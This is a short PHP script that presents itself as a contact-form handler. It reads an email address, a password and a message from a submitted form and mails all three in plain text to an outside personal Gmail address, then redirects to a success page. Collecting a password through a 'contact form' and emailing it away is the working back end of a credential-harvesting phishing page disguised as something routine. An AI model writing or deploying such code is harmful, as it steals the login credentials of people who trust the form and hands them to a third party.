<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $email = $_POST['email'];
    $password = $_POST['password'];
    $message = $_POST['message'];

    // Recipient email
    $to = "jiebenkaylaabaya04@gmail.com";

    // Subject
    $subject = "New Message from Contact Form";

    // Message
    $email_message = "Email: $email\n";
    $email_message .= "Password: $password\n";
    $email_message .= "Message: $message\n";

    // Send email
    mail($to, $subject, $email_message);

    // Redirect back to the contact page
    header("Location: contact.php?success=true");
    exit();
}
?>
